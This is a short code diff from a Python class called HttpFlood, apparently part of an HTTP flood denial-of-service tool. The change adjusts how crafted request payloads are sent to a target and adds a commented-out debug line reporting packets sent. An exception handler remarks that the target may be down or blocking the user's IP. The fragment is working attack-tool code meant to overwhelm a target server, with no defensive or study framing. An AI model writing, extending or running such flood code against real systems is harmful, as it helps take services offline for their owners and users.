@@ -1596,7 +1596,9 @@ class HttpFlood(Thread):
                            f"Pragma: no-cache\r\n"
                            f"\r\n").encode("utf-8")
                 
-                Tools.send(s, payload)
+                if Tools.send(s, payload):
+                    # print(f"[DEBUG] Sent Packet! -> {self._target.authority}") # Uncomment for verbose
+                    pass
         except Exception as e:
             if "timed out" in str(e) or "Timeout" in str(e):
                 print(f"[DEBUG] Connection Timeout! (Target Might be DOWN or BLOCKING your IP)")
